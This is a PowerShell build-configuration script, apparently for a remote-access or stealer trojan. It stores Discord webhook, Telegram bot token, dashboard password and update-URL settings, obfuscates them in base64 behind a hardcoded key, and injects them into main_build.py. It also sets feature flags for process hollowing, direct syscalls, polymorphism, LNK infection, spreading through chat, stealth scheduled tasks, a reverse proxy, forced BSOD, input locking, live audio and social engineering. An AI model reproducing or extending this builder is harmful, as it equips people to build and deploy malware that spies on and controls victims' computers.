param([string]$Mode)

if ($Mode -eq 'save') {
    $config = @{}
    $keys = @('DISCORD_WEBHOOK', 'DISCORD_USERNAME', 'DASHBOARD_PASSWORD', 'TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID', 'UPDATE_URL')
    foreach ($key in $keys) {
        $val = [System.Environment]::GetEnvironmentVariable($key)
        if ($null -eq $val) { $val = '' }
        $config[$key] = $val
    }
    $config.GetEnumerator() | ForEach-Object { $_.Key + '=' + $_.Value } | Set-Content -Path config.txt -Encoding UTF8
}
elseif ($Mode -eq 'load') {
    if (Test-Path config.txt) {
        $lines = @()
        Get-Content config.txt | ForEach-Object {
            $parts = $_ -split '=', 2
            if ($parts.Length -eq 2) {
                $lines += ('set "' + $parts[0] + '=' + $parts[1] + '"')
            }
        }
        if (Test-Path '_feat_flags.bat') {
            Get-Content '_feat_flags.bat' | ForEach-Object {
                if ($_ -match 'set\s+"([^=]+)=(.*)"$') {
                    $lines += ('set "' + $Matches[1] + '=' + $Matches[2] + '"')
                }
            }
        }
        $lines | Set-Content -Path _load_config.bat -Encoding ASCII
    }
}
elseif ($Mode -eq 'show') {
    if (Test-Path config.txt) {
        Get-Content config.txt | ForEach-Object {
            $parts = $_ -split '=', 2
            if ($parts.Length -eq 2) {
                Write-Host "     $($parts[0]): $($parts[1])"
            }
        }
    }
}
elseif ($Mode -eq 'inject') {
    $replacements = @{
        'BUILD_DISCORD_WEBHOOK' = 'DISCORD_WEBHOOK'
        'BUILD_DISCORD_USERNAME' = 'DISCORD_USERNAME'
        'BUILD_DASHBOARD_PASSWORD' = 'DASHBOARD_PASSWORD'
        'BUILD_TELEGRAM_BOT_TOKEN' = 'TELEGRAM_BOT_TOKEN'
        'BUILD_TELEGRAM_CHAT_ID' = 'TELEGRAM_CHAT_ID'
        'BUILD_UPDATE_URL' = 'UPDATE_URL'
        'BUILD_ENCRYPTION_KEY' = '_IGR_ENC_KEY'
    }
    $content = Get-Content 'main_build.py' -Raw
    foreach ($kv in $replacements.GetEnumerator()) {
        if ($kv.Value -eq '_IGR_ENC_KEY') {
            $rawVal = 'igr_enc_key_2024'
        } else {
            $rawVal = [System.Environment]::GetEnvironmentVariable($kv.Value)
            if ($null -eq $rawVal) { $rawVal = '' }
        }
        $encVal = 'ENC:' + [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($rawVal))
        $content = $content -replace [regex]::Escape($kv.Key), $encVal
    }
    $featFlags = @(
        'FEAT_POLYMORPHISM', 'FEAT_PROCESS_HOLLOWING', 'FEAT_DIRECT_SYSCALLS',
        'FEAT_OBFUSCATION', 'FEAT_SELF_SIGN', 'FEAT_PLUGINS', 'FEAT_ASYNC_IO',
        'FEAT_LNK_INFECTION', 'FEAT_SPREAD_CHAT', 'FEAT_SAFE_MODE',
        'FEAT_TASK_SCHED_STEALTH', 'FEAT_REVERSE_PROXY', 'FEAT_REMOTE_SOUND',
        'FEAT_MONITOR_TOGGLE', 'FEAT_BSOD', 'FEAT_INPUT_LOCK',
        'FEAT_DRAG_DROP', 'FEAT_LIVE_AUDIO', 'FEAT_DARK_LIGHT_MODE',
        'FEAT_MOBILE_UI', 'FEAT_EXPORT_DATA', 'FEAT_2FA',
        'FEAT_SOCIAL_ENGINEER', 'FEAT_ATTACKER_WHITELIST'
    )
    foreach ($flag in $featFlags) {
        $placeholder = 'BUILD_' + $flag
        $val = [System.Environment]::GetEnvironmentVariable($flag)
        if ($null -eq $val) { $val = '0' }
        $content = $content -replace [regex]::Escape($placeholder), $val
    }
    $content | Set-Content 'main_build.py' -NoNewline
}
